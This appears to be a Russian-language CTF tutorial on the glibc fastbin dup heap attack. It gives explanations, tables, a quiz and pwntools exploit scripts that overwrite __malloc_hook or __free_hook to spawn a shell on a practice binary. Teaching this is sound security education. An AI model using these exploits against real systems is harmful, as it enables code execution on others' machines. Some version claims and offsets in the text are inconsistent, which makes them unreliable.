---
id: pwn-fastbin-dup
title: "fastbin dup и fastbin attack"
category: pwn
parent: pwn-heap-uaf
difficulty: hard
order: 1
tags: [heap, fastbin, double-free, fastbin-dup, malloc-hook]
prerequisites: [pwn-heap-basics, pwn-heap-uaf]
useful_for:
  - "CTF Pwn категория"
  - "Эксплуатация heap-уязвимостей"
  - "Vulnerability research"
estimated_minutes: 60
summary: "Разбираем fastbin dup: double-free в fastbin позволяет вернуть один и тот же чанк дважды и перезаписать указатель next, получая аллокацию по произвольному адресу."
---
fastbin dup — атака на fastbin-списки, позволяющая получить произвольную запись через double-free. Fastbins хранят маленькие чанки (≤ 0x80 на amd64) в односвязных LIFO-списках без консолидации, и до появления tcache это был основной инструмент heap-эксплуатации. Сегодня fastbin dup всё ещё актуален: он работает даже там, где tcache заполнен, и лежит в основе многих задач.

## Устройство fastbin

Fastbin — массив списков для размеров от 0x20 до 0x80 (индексы 0..9). Каждый список односвязный (только `fd`), LIFO. `free` кладёт чанк в голову списка, `malloc` берёт из головы. Консолидации нет: чанки остаются раздельными, пока не сработает `malloc_consolidate`. Минимальный размер чанка — 0x20, поэтому fastbin-диапазон начинается с 0x20.

## Проверка double-free в fastbin

При `free` в fastbin glibc проверяет, что освобождаемый чанк не является головой списка (защита от двойного free подряд). Обход: освободить чанк A, затем B, затем снова A — тогда A не голова, и проверка проходит.

```c
char *a = malloc(0x60);
char *b = malloc(0x60);
free(a);      // fastbin: a
free(b);      // fastbin: b -> a
free(a);      // ОК: a != голова (b) -> a -> b -> a (цикл!)
```

Получается цикл `a -> b -> a`, из-за которого один и тот же чанк выдаётся дважды — это и есть overlap.

## fastbin dup: произвольная запись

После создания цикла перезаписываем `fd` одного из чанков на целевой адрес, затем делаем несколько `malloc`, чтобы дойти до цели.

```python
from pwn import *
p = process('./chall')
# 1) создаём fastbin dup
alloc(0x60); alloc(0x60)          # A, B
free(A); free(B); free(A)         # A->B->A
# 2) перезаписываем fd головного чанка (через UAF/edit)
edit(A, p64(target - 0x10))       # target-0x10, т.к. malloc вернёт +0x10
# 3) вычерпываем список
alloc(0x60)                       # вернёт A
alloc(0x60)                       # вернёт B
alloc(0x60)                       # вернёт A (снова)
alloc(0x60)                       # вернёт target!
```

Смещение `-0x10` нужно потому, что `malloc` возвращает указатель на данные (после заголовка 0x10). Проверка в `malloc`: размер чанка должен соответствовать бин-индексу, поэтому целевой адрес должен содержать валидный `size`.

## Обход проверок glibc

Современные glibc проверяют при `malloc` из fastbin: (1) размер чанка соответствует запросу; (2) `chunk_size` находится в допустимом диапазоне; (3) выравнивание. Поэтому «магический» target должен выглядеть как валидный чанк. Часто используют адрес, где по смещению `+8` лежит подходящий размер — например, `__malloc_hook - 0x23` в старых glibc.

```python
# классический target для fastbin dup (glibc < 2.34)
target = libc.symbols['__malloc_hook'] - 0x23
```

## Полный эксплойт

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # утечка libc через unsorted bin
    alloc(0x100); free(0); edit(0, b'X'*8)
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x1ecbe0
    # fastbin dup
    alloc(0x60); alloc(0x60)
    free(0); free(1); free(0)                  # A->B->A
    target = libc.symbols['__malloc_hook'] - 0x23
    edit(0, p64(target))
    alloc(0x60); alloc(0x60); alloc(0x60)      # вернуть A,B,A
    alloc(0x60, p64(libc.symbols['system']))   # записать в __malloc_hook
    alloc(0x20, b'/bin/sh\x00')                # следующий malloc -> system('/bin/sh')
    p.interactive()

exploit()
```

## fastbin dup vs tcache poisoning

| Критерий | fastbin dup | tcache poisoning |
|---|---|---|
| Размер | ≤ 0x80 | ≤ 0x410 |
| Требует | double-free | UAF/double-free |
| Проверки | есть (размер) | safe-linking (2.32+) |
| Работает при полном tcache | да | нет (нужен слот) |
| Версии | все | 2.26+ |

Комбинируйте: если tcache заполнен (7 чанков), следующий `free` уйдёт в fastbin, где и применяется fastbin dup.

## Тонкости и подводные камни

- **Порядок free.** `free(a); free(b); free(a)` — обязателен, иначе проверка отклонит.
- **Размер target.** По адресу цели должен лежать валидный `size`.
- **Выравнивание.** `target - 0x10` должен быть выровнен на 0x10.
- **`__malloc_hook` удалён в 2.34.** Ищите альтернативные цели.
- **`malloc_consolidate`.** Вызов `malloc` большого размера консолидирует fastbins — не делайте этого до завершения атаки.
- **Проверка `fd` на выравнивание.** В новых glibc добавлены проверки, усложняющие атаку.

## Справочные таблицы

| Размер чанка | fastbin индекс |
|---|---|
| 0x20 | 0 |
| 0x30 | 1 |
| 0x40 | 2 |
| 0x50 | 3 |
| 0x60 | 4 |
| 0x70 | 5 |
| 0x80 | 6 |

| Цель (старые glibc) | Смещение |
|---|---|
| `__malloc_hook` | `-0x23` |
| `__free_hook` | `-0x8` |
| `_IO_2_1_stdout_` | зависит |

## Что дальше / решение

Дальше: `pwn-heap-tcache` (основной современный приём), `pwn-unsortedbin-attack` (утечка libc), `pwn-house-of-force`, `pwn-fsop` (цели в 2.34+). Практический алгоритм: (1) проверьте, попадает ли размер в fastbin (≤ 0x80); (2) убедитесь, что tcache для этого размера заполнен, либо используйте fastbin напрямую; (3) выполните двойной free в порядке A,B,A; (4) перезапишите `fd` на цель с учётом `-0x10` и валидного `size`; (5) вычерпайте список и запишите полезное значение. fastbin dup — классика, которую полезно уметь собирать вручную.

## Детальный разбор проверок fastbin

При `free` в fastbin glibc выполняет проверки. Первая: размер чанка должен соответствовать fastbin-индексу (`fastbin_index(size) == idx`). Вторая (с glibc 2.29+): освобождаемый чанк не должен совпадать с головой списка (защита от простого double-free). Именно поэтому используется порядок A, B, A: после `free(A); free(B)` голова — B, и повторный `free(A)` проходит проверку.

При `malloc` из fastbin проверки: (1) размер запрошенного чанка соответствует индексу; (2) `chunksize` находится в диапазоне fastbin; (3) `next` (fd) указывает на выровненный адрес. Если `fd` содержит невыровненный адрес, `malloc` падает с `malloc(): unaligned fastbin chunk detected`. Поэтому target для записи выбирают так, чтобы `target - 0x10` был выровнен на 0x10, а по адресу `target + 0x8` лежал подходящий размер.

## Связка fastbin dup с malloc_consolidate

`malloc_consolidate` вызывается при запросе большого размера (не fastbin) и объединяет fastbin-чанки, помещая их в unsorted bin. Это позволяет: (1) создать overlap, а затем консолидировать, получив чанк большого размера поверх двух; (2) утечь libc через unsorted bin. Приём «fastbin dup + consolidate» часто используется, когда цель требует записи в unsorted bin.

```python
# после создания цикла и перезаписи fd:
alloc(0x500)   # вызовет malloc_consolidate -> чанки уйдут в unsorted bin
```

## Пример с целью __free_hook

```python
target = libc.symbols['__free_hook'] - 0x8
# по адресу __free_hook - 0x8 должен быть валидный size; проверьте в GDB
alloc(0x60); alloc(0x60)
free(0); free(1); free(0)
edit(0, p64(target))
alloc(0x60); alloc(0x60); alloc(0x60)
alloc(0x60, p64(libc.symbols['system']))   # запись в __free_hook
alloc(0x20, b'/bin/sh\x00')
free(3)                                     # -> system('/bin/sh')
```

## Сравнение с other fastbin-атаками

| Атака | Механизм |
|---|---|
| fastbin dup | double-free -> цикл |
| fastbin dup into stack | target = стек |
| fastbin reverse into tcache | стэшинг в tcache |
| fastbin consolidate | unsorted bin overlap |

## Итог

fastbin dup — надёжный инструмент для чанков ≤ 0x80, работающий на всех версиях glibc (с учётом проверок). Он даёт произвольную запись и часто применяется в комбинации с tcache poisoning. Освойте порядок A,B,A и вычисление `target - 0x10`; этого достаточно, чтобы решать классические heap-задачи без tcache.

## Практические рекомендации

Для отработки fastbin dup соберите программу с меню alloc/free/edit и без tcache-защит (glibc < 2.26) — так вы увидите чистую механику. Затем повторите на glibc с tcache: заполните tcache (7 чанков) и наблюдайте, как восьмой free уходит в fastbin. В GDB проверяйте `bins`, чтобы убедиться, что цикл `A -> B -> A` создан, и что после перезаписи `fd` голова указывает на target. Это даёт полное понимание атаки.

## Ограничения и когда fastbin dup не нужен

Если доступен tcache (2.26+), poisoning через tcache обычно проще: нет проверки на голову списка и не нужно вычерпывать длинный цикл. fastbin dup применяют, когда tcache для нужного размера заполнен, когда цель требует размера ≤ 0x80, или когда glibc старая. В остальных случаях предпочитайте tcache poisoning как более короткий путь.

## Итог

fastbin dup — классическая атака на односвязные fastbin-списки через double-free. Она даёт произвольную запись и работает на широком диапазоне версий glibc. Понимание проверок (голова списка, выравнивание, валидный size) необходимо для успешного применения. Держите её в арсенале рядом с tcache poisoning.

## Завершение

fastbin dup остаётся важной техникой даже в эпоху tcache: она учит думать о связных списках аллокатора и о проверках, которые эти списки защищают. Разобрав её вручную, вы поймёте механику всех fastbin-атак.
Она остаётся надёжным инструментом и в комбинации с современными приёмами.

## Квиз

```quiz
- question: "Почему fastbin позволяет double-free?"
  options:
    - "Это односвязный LIFO-список без немедленной консолидации"
    - "Он зашифрован"
    - "Он только для больших чанков"
    - "Он в ядре"
  answer: 0
  explanation: "Fastbin — односвязный список; double-free создаёт цикл и дубликаты."
- question: "Где fastbin хранит указатель next?"
  options:
    - "В поле fd (первые 8 байт пользовательских данных)"
    - "В GOT"
    - "В canary"
    - "В vtable"
  answer: 0
  explanation: "Свободный fastbin-чанк использует fd как next."
- question: "Почему нельзя free один и тот же чанк дважды подряд?"
  options:
    - "Сработает проверка top-of-list (victim == fastbin->fd)"
    - "Он зашифрован"
    - "Он read-only"
    - "Это не запрещено"
  answer: 0
  explanation: "glibc детектирует двойной free на вершине fastbin; нужен free(b) между."
- question: "Зачем целиться в __malloc_hook - 0x23?"
  options:
    - "Чтобы рядом было правдоподобное поле size и пройти проверку fastbin"
    - "Чтобы отключить ASLR"
    - "Чтобы расширить tcache"
    - "Чтобы снять canary"
  answer: 0
  explanation: "Смещение подбирают так, чтобы фейковый чанк имел валидный size."
- question: "Что изменилось на glibc ≥ 2.34 для fastbin-атаки?"
  options:
    - "Удалены __malloc_hook/__free_hook — цели сместились на FSOP/TLS/exit"
    - "Fastbin отключён"
    - "Появился tcache"
    - "ASLR выключен"
  answer: 0
  explanation: "Хуки удалены, поэтому используют _IO_list_all, __exit_funcs, tls_dtor_list."
```

## Где пригодится

- **CTF:** Pwn — heap-задачи с double-free/UAF.
- **Bug bounty:** анализ heap-багов.
- **Пентест:** разработка эксплойтов.
- **Работа:** security research glibc.
